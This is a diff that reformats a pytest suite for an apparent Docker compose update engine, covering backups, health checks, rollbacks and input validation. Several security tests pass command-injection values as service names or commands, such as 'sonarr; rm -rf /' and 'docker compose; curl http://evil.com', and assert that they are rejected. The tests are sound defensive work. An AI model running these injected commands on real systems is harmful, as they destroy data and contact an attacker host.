@@ -30,9 +30,11 @@ def mock_filesystem():
         # Return self for resolve() calls to bypass filesystem checks
         return self
 
-    with patch.object(Path, 'exists', lambda self: True), \
-         patch.object(Path, 'is_file', lambda self: True), \
-         patch.object(Path, 'resolve', mock_resolve):
+    with (
+        patch.object(Path, "exists", lambda self: True),
+        patch.object(Path, "is_file", lambda self: True),
+        patch.object(Path, "resolve", mock_resolve),
+    ):
         yield
 
 
@@ -53,7 +55,9 @@ class TestPathTranslation:
 
         host_path = UpdateEngine._translate_container_path_to_host(container_path)
 
-        assert host_path == "/srv/raid0/docker/compose/network/traefik/docker-compose.yml"
+        assert (
+            host_path == "/srv/raid0/docker/compose/network/traefik/docker-compose.yml"
+        )
 
     def test_rejects_path_outside_compose_directory(self):
         """Test paths outside /compose are rejected."""
@@ -67,9 +71,11 @@ class TestPathTranslation:
         # 1. It doesn't exist (caught by Path.resolve)
         # 2. It's outside /compose (caught by directory check)
         error_msg = str(exc_info.value).lower()
-        assert ("no such file" in error_msg or
-                "compose file must be within" in error_msg or
-                "not within /compose" in error_msg)
+        assert (
+            "no such file" in error_msg
+            or "compose file must be within" in error_msg
+            or "not within /compose" in error_msg
+        )
 
     def test_rejects_path_traversal_attempts(self):
         """Test path traversal attempts are blocked."""
@@ -79,8 +85,10 @@ class TestPathTranslation:
             UpdateEngine._translate_container_path_to_host(container_path)
 
         # Path traversal is caught by forbidden patterns check (..)
-        assert ("forbidden patterns" in str(exc_info.value).lower() or
-                "traversal" in str(exc_info.value).lower())
+        assert (
+            "forbidden patterns" in str(exc_info.value).lower()
+            or "traversal" in str(exc_info.value).lower()
+        )
 
     def test_rejects_path_with_null_bytes(self):
         """Test paths with null bytes are rejected."""
@@ -114,10 +122,11 @@ class TestBackupAndRestore:
         """Test backup creates file in /data/backups."""
         compose_file = "/compose/media/sonarr.yml"
 
-        with patch("shutil.copy2") as mock_copy, \
-             patch("os.makedirs") as mock_makedirs, \
-             patch("os.path.basename", return_value="sonarr.yml"):
-
+        with (
+            patch("shutil.copy2") as mock_copy,
+            patch("os.makedirs") as mock_makedirs,
+            patch("os.path.basename", return_value="sonarr.yml"),
+        ):
             backup_path = await UpdateEngine._backup_compose_file(compose_file)
 
             assert backup_path.startswith("/data/backups/sonarr.yml.backup.")
@@ -129,10 +138,11 @@ class TestBackupAndRestore:
         """Test backup filename includes timestamp."""
         compose_file = "/compose/media/sonarr.yml"
 
-        with patch("shutil.copy2"), \
-             patch("os.makedirs"), \
-             patch("os.path.basename", return_value="sonarr.yml"):
-
+        with (
+            patch("shutil.copy2"),
+            patch("os.makedirs"),
+            patch("os.path.basename", return_value="sonarr.yml"),
+        ):
             backup_path = await UpdateEngine._backup_compose_file(compose_file)
 
             # Should match pattern: sonarr.yml.backup.1234567890
@@ -146,9 +156,10 @@ class TestBackupAndRestore:
         """Test backup raises PermissionError when copy fails."""
         compose_file = "/compose/media/sonarr.yml"
 
-        with patch("shutil.copy2", side_effect=PermissionError("Permission denied")), \
-             patch("os.makedirs"):
-
+        with (
+            patch("shutil.copy2", side_effect=PermissionError("Permission denied")),
+            patch("os.makedirs"),
+        ):
             with pytest.raises(PermissionError) as exc_info:
                 await UpdateEngine._backup_compose_file(compose_file)
 
@@ -186,10 +197,7 @@ class TestDockerComposeExecution:
         service_name = "sonarr; rm -rf /"  # Malicious service name
 
         result = await UpdateEngine._execute_docker_compose(
-            compose_file,
-            service_name,
-            "/var/run/docker.sock",
-            "docker compose"
+            compose_file, service_name, "/var/run/docker.sock", "docker compose"
         )
 
         assert result["success"] is False
@@ -202,10 +210,7 @@ class TestDockerComposeExecution:
         service_name = "sonarr"
 
         result = await UpdateEngine._execute_docker_compose(
-            compose_file,
-            service_name,
-            "/var/run/docker.sock",
-            "docker compose"
+            compose_file, service_name, "/var/run/docker.sock", "docker compose"
         )
 
         assert result["success"] is False
@@ -219,10 +224,7 @@ class TestDockerComposeExecution:
         malicious_cmd = "docker compose; curl http://evil.com"
 
         result = await UpdateEngine._execute_docker_compose(
-            compose_file,
-            service_name,
-            "/var/run/docker.sock",
-            malicious_cmd
+            compose_file, service_name, "/var/run/docker.sock", malicious_cmd
         )
 
         assert result["success"] is False
@@ -241,14 +243,14 @@ class TestDockerComposeExecution:
         async def mock_wait_for(coro, timeout):
             return await coro
 
-        with patch("asyncio.create_subprocess_exec", return_value=mock_process) as mock_exec, \
-             patch("asyncio.wait_for", side_effect=mock_wait_for):
-
+        with (
+            patch(
+                "asyncio.create_subprocess_exec", return_value=mock_process
+            ) as mock_exec,
+            patch("asyncio.wait_for", side_effect=mock_wait_for),
+        ):
             await UpdateEngine._execute_docker_compose(
-                compose_file,
-                service_name,
-                "/var/run/docker.sock",
-                "docker compose"
+                compose_file, service_name, "/var/run/docker.sock", "docker compose"
             )
 
             # Should have called subprocess twice: stop and up
@@ -271,14 +273,14 @@ class TestDockerComposeExecution:
         async def mock_wait_for(coro, timeout):
             return await coro
 
-        with patch("asyncio.create_subprocess_exec", return_value=mock_process) as mock_exec, \
-             patch("asyncio.wait_for", side_effect=mock_wait_for):
-
+        with (
+            patch(
+                "asyncio.create_subprocess_exec", return_value=mock_process
+            ) as mock_exec,
+            patch("asyncio.wait_for", side_effect=mock_wait_for),
+        ):
             result = await UpdateEngine._execute_docker_compose(
-                compose_file,
-                service_name,
-                "/var/run/docker.sock",
-                "docker compose"
+                compose_file, service_name, "/var/run/docker.sock", "docker compose"
             )
 
             assert result["success"] is True
@@ -300,14 +302,12 @@ class TestDockerComposeExecution:
         mock_process = AsyncMock()
         mock_process.communicate = AsyncMock()
 
-        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
-             patch("asyncio.wait_for", side_effect=asyncio.TimeoutError()):
-
+        with (
+            patch("asyncio.create_subprocess_exec", return_value=mock_process),
+            patch("asyncio.wait_for", side_effect=asyncio.TimeoutError()),
+        ):
             result = await UpdateEngine._execute_docker_compose(
-                compose_file,
-                service_name,
-                "/var/run/docker.sock",
-                "docker compose"
+                compose_file, service_name, "/var/run/docker.sock", "docker compose"
             )
 
             assert result["success"] is False
@@ -320,20 +320,20 @@ class TestDockerComposeExecution:
         service_name = "sonarr"
 
         mock_process = AsyncMock()
-        mock_process.communicate = AsyncMock(return_value=(b"", b"Error: Image not found"))
+        mock_process.communicate = AsyncMock(
+            return_value=(b"", b"Error: Image not found")
+        )
         mock_process.returncode = 1
 
         async def mock_wait_for(coro, timeout):
             return await coro
 
-        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
-             patch("asyncio.wait_for", side_effect=mock_wait_for):
-
+        with (
+            patch("asyncio.create_subprocess_exec", return_value=mock_process),
+            patch("asyncio.wait_for", side_effect=mock_wait_for),
+        ):
             result = await UpdateEngine._execute_docker_compose(
-                compose_file,
-                service_name,
-                "/var/run/docker.sock",
-                "docker compose"
+                compose_file, service_name, "/var/run/docker.sock", "docker compose"
             )
 
             assert result["success"] is False
@@ -356,14 +356,14 @@ class TestImagePulling:
         async def mock_wait_for(coro, timeout):
             return await coro
 
-        with patch("asyncio.create_subprocess_exec", return_value=mock_process) as mock_exec, \
-             patch("asyncio.wait_for", side_effect=mock_wait_for):
-
+        with (
+            patch(
+                "asyncio.create_subprocess_exec", return_value=mock_process
+            ) as mock_exec,
+            patch("asyncio.wait_for", side_effect=mock_wait_for),
+        ):
             result = await UpdateEngine._pull_docker_image(
-                compose_file,
-                service_name,
-                "/var/run/docker.sock",
-                "docker compose"
+                compose_file, service_name, "/var/run/docker.sock", "docker compose"
             )
 
             assert result["success"] is True
@@ -381,14 +381,12 @@ class TestImagePulling:
 
         mock_process = AsyncMock()
 
-        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
-             patch("asyncio.wait_for", side_effect=asyncio.TimeoutError()):
-
+        with (
+            patch("asyncio.create_subprocess_exec", return_value=mock_process),
+            patch("asyncio.wait_for", side_effect=asyncio.TimeoutError()),
+        ):
             result = await UpdateEngine._pull_docker_image(
-                compose_file,
-                service_name,
-                "/var/run/docker.sock",
-                "docker compose"
+                compose_file, service_name, "/var/run/docker.sock", "docker compose"
             )
 
             assert result["success"] is False
@@ -401,10 +399,7 @@ class TestImagePulling:
         service_name = "malicious; curl http://evil.com"
 
         result = await UpdateEngine._pull_docker_image(
-            compose_file,
-            service_name,
-            "/var/run/docker.sock",
-            "docker compose"
+            compose_file, service_name, "/var/run/docker.sock", "docker compose"
         )
 
         assert result["success"] is False
@@ -425,7 +420,7 @@ class TestHealthCheckValidation:
             compose_file="/compose/media/sonarr.yml",
             service_name="sonarr",
             health_check_url="http://localhost:8989/ping",
-            health_check_method="http"
+            health_check_method="http",
         )
 
         mock_response = MagicMock()
@@ -454,7 +449,7 @@ class TestHealthCheckValidation:
             compose_file="/compose/media/sonarr.yml",
             service_name="sonarr",
             health_check_url="http://localhost:8989/ping",
-            health_check_method="http"
+            health_check_method="http",
         )
 
         # First two attempts return 503, third returns 200
@@ -469,9 +464,10 @@ class TestHealthCheckValidation:
         mock_client.__aexit__ = AsyncMock()
         mock_client.get = AsyncMock(side_effect=responses)
 
-        with patch("httpx.AsyncClient", return_value=mock_client), \
-             patch("asyncio.sleep", return_value=None):  # Speed up test
-
+        with (
+            patch("httpx.AsyncClient", return_value=mock_client),
+            patch("asyncio.sleep", return_value=None),
+        ):  # Speed up test
             result = await UpdateEngine._validate_health_check(container, timeout=60)
 
             assert result["success"] is True
@@ -489,7 +485,7 @@ class TestHealthCheckValidation:
             compose_file="/compose/media/sonarr.yml",
             service_name="sonarr",
             health_check_url="http://localhost:8989/ping",
-            health_check_method="http"
+            health_check_method="http",
         )
 
         mock_client = MagicMock()
@@ -497,14 +493,18 @@ class TestHealthCheckValidation:
         mock_client.__aexit__ = AsyncMock()
 
         import httpx
+
         mock_client.get = AsyncMock(side_effect=httpx.TimeoutException("Timeout"))
 
-        mock_docker_check = AsyncMock(return_value={"success": True, "method": "docker_inspect"})
+        mock_docker_check = AsyncMock(
+            return_value={"success": True, "method": "docker_inspect"}
+        )
 
-        with patch("httpx.AsyncClient", return_value=mock_client), \
-             patch.object(UpdateEngine, "_check_container_runtime", mock_docker_check), \
-             patch("asyncio.sleep", return_value=None):
-
+        with (
+            patch("httpx.AsyncClient", return_value=mock_client),
+            patch.object(UpdateEngine, "_check_container_runtime", mock_docker_check),
+            patch("asyncio.sleep", return_value=None),
+        ):
             result = await UpdateEngine._validate_health_check(container, timeout=60)
 
             assert result["success"] is True
@@ -521,7 +521,7 @@ class TestHealthCheckValidation:
             registry="lscr.io",
             compose_file="/compose/media/sonarr.yml",
             service_name="sonarr",
-            health_check_method="docker"
+            health_check_method="docker",
         )
 
         mock_process = AsyncMock()
@@ -531,9 +531,10 @@ class TestHealthCheckValidation:
         async def mock_wait_for(coro, timeout):
             return await coro
 
-        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
-             patch("asyncio.wait_for", side_effect=mock_wait_for):
-
+        with (
+            patch("asyncio.create_subprocess_exec", return_value=mock_process),
+            patch("asyncio.wait_for", side_effect=mock_wait_for),
+        ):
             result = await UpdateEngine._check_container_runtime(container)
 
             assert result["success"] is True
@@ -549,7 +550,7 @@ class TestHealthCheckValidation:
             registry="lscr.io",
             compose_file="/compose/media/sonarr.yml",
             service_name="sonarr",
-            health_check_method="docker"
+            health_check_method="docker",
         )
 
         mock_process = AsyncMock()
@@ -559,9 +560,10 @@ class TestHealthCheckValidation:
         async def mock_wait_for(coro, timeout):
             return await coro
 
-        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
-             patch("asyncio.wait_for", side_effect=mock_wait_for):
-
+        with (
+            patch("asyncio.create_subprocess_exec", return_value=mock_process),
+            patch("asyncio.wait_for", side_effect=mock_wait_for),
+        ):
             result = await UpdateEngine._check_container_runtime(container)
 
             assert result["success"] is False
@@ -580,14 +582,17 @@ class TestHealthCheckValidation:
             registry="lscr.io",
             compose_file="/compose/media/sonarr.yml",
             service_name="sonarr; rm -rf /",  # Both name and service_name are malicious
-            health_check_method="docker"
+            health_check_method="docker",
         )
 
         result = await UpdateEngine._check_container_runtime(container)
 
         # Should fail when both name and service_name are invalid
         assert result["success"] is False
-        assert "no valid container name" in result.get("error", "").lower() or result.get("error") is not None
+        assert (
+            "no valid container name" in result.get("error", "").lower()
+            or result.get("error") is not None
+        )
 
 
 class TestApplyUpdateOrchestration:
@@ -621,7 +626,7 @@ class TestApplyUpdateOrchestration:
             registry="lscr.io",
             compose_file="/compose/media/sonarr.yml",
             service_name="sonarr",
-            health_check_url="http://localhost:8989/ping"
+            health_check_url="http://localhost:8989/ping",
         )
 
     @pytest.fixture
@@ -635,7 +640,7 @@ class TestApplyUpdateOrchestration:
             status="approved",
             reason_type="feature",
             reason_summary="New features and improvements",
-            cves_fixed=[]
+            cves_fixed=[],
         )
 
     @pytest.mark.asyncio
@@ -648,7 +653,7 @@ class TestApplyUpdateOrchestration:
             to_tag="4.0.0",
             status="pending",  # Not approved
             reason_type="feature",
-            reason_summary="Test"
+            reason_summary="Test",
         )
 
         mock_result = MagicMock()
@@ -661,7 +666,9 @@ class TestApplyUpdateOrchestration:
         assert "must be approved first" in str(exc_info.value)
 
     @pytest.mark.asyncio
-    async def test_apply_update_creates_backup_before_changes(self, mock_db, mock_container, mock_update):
+    async def test_apply_update_creates_backup_before_changes(
+        self, mock_db, mock_container, mock_update
+    ):
         """Test apply_update creates backup before making changes."""
         # Mock database queries
         update_result = MagicMock()
@@ -678,21 +685,30 @@ class TestApplyUpdateOrchestration:
         mock_execute = AsyncMock(return_value={"success": True})
         mock_health = AsyncMock(return_value={"success": True, "method": "http_check"})
 
-        with patch.object(UpdateEngine, "_backup_compose_file", mock_backup), \
-             patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
-             patch.object(UpdateEngine, "_pull_docker_image", mock_pull), \
-             patch.object(UpdateEngine, "_execute_docker_compose", mock_execute), \
-             patch.object(UpdateEngine, "_validate_health_check", mock_health), \
-             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
-             patch("app.services.event_bus.event_bus.publish", return_value=None):
-
+        with (
+            patch.object(UpdateEngine, "_backup_compose_file", mock_backup),
+            patch(
+                "app.services.compose_parser.ComposeParser.update_compose_file",
+                mock_compose_update,
+            ),
+            patch.object(UpdateEngine, "_pull_docker_image", mock_pull),
+            patch.object(UpdateEngine, "_execute_docker_compose", mock_execute),
+            patch.object(UpdateEngine, "_validate_health_check", mock_health),
+            patch(
+                "app.services.settings_service.SettingsService.get",
+                return_value="/var/run/docker.sock",
+            ),
+            patch("app.services.event_bus.event_bus.publish", return_value=None),
+        ):
             result = await UpdateEngine.apply_update(mock_db, 1, "user")
 
             assert result["success"] is True
             mock_backup.assert_called_once_with("/compose/media/sonarr.yml")
 
     @pytest.mark.asyncio
-    async def test_apply_update_executes_phases_in_order(self, mock_db, mock_container, mock_update):
+    async def test_apply_update_executes_phases_in_order(
+        self, mock_db, mock_container, mock_update
+    ):
         """Test apply_update executes phases in correct order."""
         update_result = MagicMock()
         update_result.scalar_one_or_none = MagicMock(return_value=mock_update)
@@ -724,21 +740,36 @@ class TestApplyUpdateOrchestration:
             call_order.append("health_check")
             return {"success": True, "method": "http_check"}
 
-        with patch.object(UpdateEngine, "_backup_compose_file", track_backup), \
-             patch("app.services.compose_parser.ComposeParser.update_compose_file", track_compose_update), \
-             patch.object(UpdateEngine, "_pull_docker_image", track_pull), \
-             patch.object(UpdateEngine, "_execute_docker_compose", track_execute), \
-             patch.object(UpdateEngine, "_validate_health_check", track_health), \
-             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
-             patch("app.services.event_bus.event_bus.publish", new=AsyncMock()):
-
+        with (
+            patch.object(UpdateEngine, "_backup_compose_file", track_backup),
+            patch(
+                "app.services.compose_parser.ComposeParser.update_compose_file",
+                track_compose_update,
+            ),
+            patch.object(UpdateEngine, "_pull_docker_image", track_pull),
+            patch.object(UpdateEngine, "_execute_docker_compose", track_execute),
+            patch.object(UpdateEngine, "_validate_health_check", track_health),
+            patch(
+                "app.services.settings_service.SettingsService.get",
+                return_value="/var/run/docker.sock",
+            ),
+            patch("app.services.event_bus.event_bus.publish", new=AsyncMock()),
+        ):
             await UpdateEngine.apply_update(mock_db, 1, "user")
 
             # Verify order: backup -> compose_update -> pull -> execute -> health_check
-            assert call_order == ["backup", "compose_update", "pull", "execute", "health_check"]
+            assert call_order == [
+                "backup",
+                "compose_update",
+                "pull",
+                "execute",
+                "health_check",
+            ]
 
     @pytest.mark.asyncio
-    async def test_apply_update_restores_backup_on_failure(self, mock_db, mock_container, mock_update):
+    async def test_apply_update_restores_backup_on_failure(
+        self, mock_db, mock_container, mock_update
+    ):
         """Test apply_update restores backup when health check fails."""
         update_result = MagicMock()
         update_result.scalar_one_or_none = MagicMock(return_value=mock_update)
@@ -752,18 +783,27 @@ class TestApplyUpdateOrchestration:
         mock_compose_update = AsyncMock(return_value=True)
         mock_pull = AsyncMock(return_value={"success": True})
         mock_execute = AsyncMock(return_value={"success": True})
-        mock_health = AsyncMock(return_value={"success": False, "error": "Health check timeout"})
+        mock_health = AsyncMock(
+            return_value={"success": False, "error": "Health check timeout"}
+        )
         mock_restore = AsyncMock()
 
-        with patch.object(UpdateEngine, "_backup_compose_file", mock_backup), \
-             patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
-             patch.object(UpdateEngine, "_pull_docker_image", mock_pull), \
-             patch.object(UpdateEngine, "_execute_docker_compose", mock_execute), \
-             patch.object(UpdateEngine, "_validate_health_check", mock_health), \
-             patch.object(UpdateEngine, "_restore_compose_file", mock_restore), \
-             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
-             patch("app.services.event_bus.event_bus.publish", new=AsyncMock()):
-
+        with (
+            patch.object(UpdateEngine, "_backup_compose_file", mock_backup),
+            patch(
+                "app.services.compose_parser.ComposeParser.update_compose_file",
+                mock_compose_update,
+            ),
+            patch.object(UpdateEngine, "_pull_docker_image", mock_pull),
+            patch.object(UpdateEngine, "_execute_docker_compose", mock_execute),
+            patch.object(UpdateEngine, "_validate_health_check", mock_health),
+            patch.object(UpdateEngine, "_restore_compose_file", mock_restore),
+            patch(
+                "app.services.settings_service.SettingsService.get",
+                return_value="/var/run/docker.sock",
+            ),
+            patch("app.services.event_bus.event_bus.publish", new=AsyncMock()),
+        ):
             result = await UpdateEngine.apply_update(mock_db, 1, "user")
 
             assert result["success"] is False
@@ -771,7 +811,9 @@ class TestApplyUpdateOrchestration:
             mock_restore.assert_called_once()
 
     @pytest.mark.asyncio
-    async def test_apply_update_schedules_retry_on_failure(self, mock_db, mock_container, mock_update):
+    async def test_apply_update_schedules_retry_on_failure(
+        self, mock_db, mock_container, mock_update
+    ):
         """Test apply_update schedules retry when update fails."""
         update_result = MagicMock()
         update_result.scalar_one_or_none = MagicMock(return_value=mock_update)
@@ -787,18 +829,29 @@ class TestApplyUpdateOrchestration:
 
         # Also need to mock the history query for rollback checking
         history_result = MagicMock()
-        history_result.scalar_one_or_none = MagicMock(return_value=None)  # No history yet
+        history_result.scalar_one_or_none = MagicMock(
+            return_value=None
+        )  # No history yet
 
         # Update execute mock to handle history query
-        mock_db.execute = AsyncMock(side_effect=[update_result, container_result, history_result])
+        mock_db.execute = AsyncMock(
+            side_effect=[update_result, container_result, history_result]
+        )
 
-        with patch.object(UpdateEngine, "_backup_compose_file", mock_backup), \
-             patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
-             patch.object(UpdateEngine, "_pull_docker_image", mock_pull), \
-             patch.object(UpdateEngine, "_restore_compose_file", AsyncMock()), \
-             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
-             patch("app.services.event_bus.event_bus.publish", return_value=None):
-
+        with (
+            patch.object(UpdateEngine, "_backup_compose_file", mock_backup),
+            patch(
+                "app.services.compose_parser.ComposeParser.update_compose_file",
+                mock_compose_update,
+            ),
+            patch.object(UpdateEngine, "_pull_docker_image", mock_pull),
+            patch.object(UpdateEngine, "_restore_compose_file", AsyncMock()),
+            patch(
+                "app.services.settings_service.SettingsService.get",
+                return_value="/var/run/docker.sock",
+            ),
+            patch("app.services.event_bus.event_bus.publish", return_value=None),
+        ):
             result = await UpdateEngine.apply_update(mock_db, 1, "user")
 
             assert result["success"] is False
@@ -843,7 +896,7 @@ class TestRollbackUpdate:
             status="success",
             can_rollback=True,
             backup_path="/data/backups/sonarr.yml.backup.123",
-            triggered_by="user"
+            triggered_by="user",
         )
 
     @pytest.fixture
@@ -856,7 +909,7 @@ class TestRollbackUpdate:
             current_tag="4.0.0",
             registry="lscr.io",
             compose_file="/compose/media/sonarr.yml",
-            service_name="sonarr"
+            service_name="sonarr",
         )
 
     @pytest.mark.asyncio
@@ -869,7 +922,7 @@ class TestRollbackUpdate:
             from_tag="3.0.0",
             to_tag="4.0.0",
             status="success",
-            can_rollback=False  # Cannot rollback
+            can_rollback=False,  # Cannot rollback
         )
 
         mock_result = MagicMock()
@@ -892,7 +945,7 @@ class TestRollbackUpdate:
             to_tag="4.0.0",
             status="rolled_back",
             can_rollback=True,
-            rolled_back_at=datetime.now(timezone.utc)  # Already rolled back
+            rolled_back_at=datetime.now(timezone.utc),  # Already rolled back
         )
 
         mock_result = MagicMock()
@@ -905,7 +958,9 @@ class TestRollbackUpdate:
         assert "already been rolled back" in str(exc_info.value)
 
     @pytest.mark.asyncio
-    async def test_rollback_rejects_if_container_version_mismatch(self, mock_db, mock_history):
+    async def test_rollback_rejects_if_container_version_mismatch(
+        self, mock_db, mock_history
+    ):
         """Test rollback rejects if container is not at expected version."""
         mock_history.to_tag = "4.0.0"
 
@@ -916,7 +971,7 @@ class TestRollbackUpdate:
             current_tag="5.0.0",  # Different version!
             registry="lscr.io",
             compose_file="/compose/media/sonarr.yml",
-            service_name="sonarr"
+            service_name="sonarr",
         )
 
         history_result = MagicMock()
@@ -933,7 +988,9 @@ class TestRollbackUpdate:
         assert "expected 4.0.0" in str(exc_info.value)
 
     @pytest.mark.asyncio
-    async def test_rollback_updates_compose_to_old_tag(self, mock_db, mock_history, mock_container):
+    async def test_rollback_updates_compose_to_old_tag(
+        self, mock_db, mock_history, mock_container
+    ):
         """Test rollback updates compose file to old tag."""
         history_result = MagicMock()
         history_result.scalar_one_or_none = MagicMock(return_value=mock_history)
@@ -946,24 +1003,30 @@ class TestRollbackUpdate:
         mock_compose_update = AsyncMock(return_value=True)
         mock_execute = AsyncMock(return_value={"success": True})
 
-        with patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
-             patch.object(UpdateEngine, "_execute_docker_compose", mock_execute), \
-             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
-             patch("app.services.event_bus.event_bus.publish", return_value=None):
-
+        with (
+            patch(
+                "app.services.compose_parser.ComposeParser.update_compose_file",
+                mock_compose_update,
+            ),
+            patch.object(UpdateEngine, "_execute_docker_compose", mock_execute),
+            patch(
+                "app.services.settings_service.SettingsService.get",
+                return_value="/var/run/docker.sock",
+            ),
+            patch("app.services.event_bus.event_bus.publish", return_value=None),
+        ):
             result = await UpdateEngine.rollback_update(mock_db, 1)
 
             assert result["success"] is True
             # Should have updated to old tag (3.0.0)
             mock_compose_update.assert_called_once_with(
-                "/compose/media/sonarr.yml",
-                "sonarr",
-                "3.0.0",
-                mock_db
+                "/compose/media/sonarr.yml", "sonarr", "3.0.0", mock_db
             )
 
     @pytest.mark.asyncio
-    async def test_rollback_executes_docker_compose(self, mock_db, mock_history, mock_container):
+    async def test_rollback_executes_docker_compose(
+        self, mock_db, mock_history, mock_container
+    ):
         """Test rollback executes docker compose."""
         history_result = MagicMock()
         history_result.scalar_one_or_none = MagicMock(return_value=mock_history)
@@ -976,18 +1039,27 @@ class TestRollbackUpdate:
         mock_compose_update = AsyncMock(return_value=True)
         mock_execute = AsyncMock(return_value={"success": True})
 
-        with patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
-             patch.object(UpdateEngine, "_execute_docker_compose", mock_execute), \
-             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
-             patch("app.services.event_bus.event_bus.publish", return_value=None):
-
+        with (
+            patch(
+                "app.services.compose_parser.ComposeParser.update_compose_file",
+                mock_compose_update,
+            ),
+            patch.object(UpdateEngine, "_execute_docker_compose", mock_execute),
+            patch(
+                "app.services.settings_service.SettingsService.get",
+                return_value="/var/run/docker.sock",
+            ),
+            patch("app.services.event_bus.event_bus.publish", return_value=None),
+        ):
             result = await UpdateEngine.rollback_update(mock_db, 1)
 
             assert result["success"] is True
             mock_execute.assert_called_once()
 
     @pytest.mark.asyncio
-    async def test_rollback_updates_history_status(self, mock_db, mock_history, mock_container):
+    async def test_rollback_updates_history_status(
+        self, mock_db, mock_history, mock_container
+    ):
         """Test rollback updates history status and timestamp."""
         history_result = MagicMock()
         history_result.scalar_one_or_none = MagicMock(return_value=mock_history)
@@ -997,11 +1069,22 @@ class TestRollbackUpdate:
 
         mock_db.execute = AsyncMock(side_effect=[history_result, container_result])
 
-        with patch("app.services.compose_parser.ComposeParser.update_compose_file", AsyncMock(return_value=True)), \
-             patch.object(UpdateEngine, "_execute_docker_compose", AsyncMock(return_value={"success": True})), \
-             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
-             patch("app.services.event_bus.event_bus.publish", return_value=None):
-
+        with (
+            patch(
+                "app.services.compose_parser.ComposeParser.update_compose_file",
+                AsyncMock(return_value=True),
+            ),
+            patch.object(
+                UpdateEngine,
+                "_execute_docker_compose",
+                AsyncMock(return_value={"success": True}),
+            ),
+            patch(
+                "app.services.settings_service.SettingsService.get",
+                return_value="/var/run/docker.sock",
+            ),
+            patch("app.services.event_bus.event_bus.publish", return_value=None),
+        ):
             result = await UpdateEngine.rollback_update(mock_db, 1)
 
             assert result["success"] is True
@@ -1017,7 +1100,9 @@ class TestVulnForgeIntegration:
         """Test VulnForge client returns None when disabled."""
         mock_db = AsyncMock()
 
-        with patch("app.services.settings_service.SettingsService.get_bool", return_value=False):
+        with patch(
+            "app.services.settings_service.SettingsService.get_bool", return_value=False
+        ):
             client = await UpdateEngine._get_vulnforge_client(mock_db)
 
             assert client is None
@@ -1027,9 +1112,15 @@ class TestVulnForgeIntegration:
         """Test VulnForge client returns None when URL not configured."""
         mock_db = AsyncMock()
 
-        with patch("app.services.settings_service.SettingsService.get_bool", return_value=True), \
-             patch("app.services.settings_service.SettingsService.get", return_value=None):
-
+        with (
+            patch(
+                "app.services.settings_service.SettingsService.get_bool",
+                return_value=True,
+            ),
+            patch(
+                "app.services.settings_service.SettingsService.get", return_value=None
+            ),
+        ):
             client = await UpdateEngine._get_vulnforge_client(mock_db)
 
             assert client is None
@@ -1043,7 +1134,7 @@ class TestVulnForgeIntegration:
             config = {
                 "vulnforge_url": "http://vulnforge:8080",
                 "vulnforge_auth_type": "api_key",
-                "vulnforge_api_key": "test-key-123"
+                "vulnforge_api_key": "test-key-123",
             }
             return config.get(key, default)
 
@@ -1052,11 +1143,17 @@ class TestVulnForgeIntegration:
                 return True
             return default
 
-        with patch("app.services.settings_service.SettingsService.get_bool", mock_get_bool), \
-             patch("app.services.settings_service.SettingsService.get", mock_get):
-
+        with (
+            patch(
+                "app.services.settings_service.SettingsService.get_bool", mock_get_bool
+            ),
+            patch("app.services.settings_service.SettingsService.get", mock_get),
+        ):
             from app.services.vulnforge_client import VulnForgeClient
-            with patch.object(VulnForgeClient, "__init__", return_value=None) as mock_init:
+
+            with patch.object(
+                VulnForgeClient, "__init__", return_value=None
+            ) as mock_init:
                 await UpdateEngine._get_vulnforge_client(mock_db)
 
                 mock_init.assert_called_once_with(
@@ -1064,7 +1161,7 @@ class TestVulnForgeIntegration:
                     auth_type="api_key",
                     api_key="test-key-123",
                     username=None,
-                    password=None
+                    password=None,
                 )
 
 
@@ -1084,7 +1181,7 @@ class TestEventBusProgress:
             status="approved",
             reason_type="feature",
             reason_summary="Test",
-            cves_fixed=[]
+            cves_fixed=[],
         )
 
         container = Container(
@@ -1094,7 +1191,7 @@ class TestEventBusProgress:
             current_tag="3.0.0",
             registry="lscr.io",
             compose_file="/compose/media/sonarr.yml",
-            service_name="sonarr"
+            service_name="sonarr",
         )
 
         update_result = MagicMock()
@@ -1106,12 +1203,18 @@ class TestEventBusProgress:
         mock_db.execute = AsyncMock(side_effect=[update_result, container_result])
 
         events = []
+
         async def capture_event(event):
             events.append(event)
 
-        with patch.object(UpdateEngine, "_backup_compose_file", AsyncMock(side_effect=Exception("Stop here"))), \
-             patch("app.services.event_bus.event_bus.publish", capture_event):
-
+        with (
+            patch.object(
+                UpdateEngine,
+                "_backup_compose_file",
+                AsyncMock(side_effect=Exception("Stop here")),
+            ),
+            patch("app.services.event_bus.event_bus.publish", capture_event),
+        ):
             try:
                 await UpdateEngine.apply_update(mock_db, 1, "user")
             except Exception:
@@ -1144,7 +1247,7 @@ class TestEventBusProgress:
             status="approved",
             reason_type="feature",
             reason_summary="Test",
-            cves_fixed=[]
+            cves_fixed=[],
         )
 
         container = Container(
@@ -1155,7 +1258,7 @@ class TestEventBusProgress:
             registry="lscr.io",
             compose_file="/compose/media/sonarr.yml",
             service_name="sonarr",
-            health_check_url="http://localhost:8989/ping"
+            health_check_url="http://localhost:8989/ping",
         )
 
         update_result = MagicMock()
@@ -1167,17 +1270,41 @@ class TestEventBusProgress:
         mock_db.execute = AsyncMock(side_effect=[update_result, container_result])
 
         events = []
+
         async def capture_event(event):
             events.append(event)
 
-        with patch.object(UpdateEngine, "_backup_compose_file", AsyncMock(return_value="/data/backups/test")), \
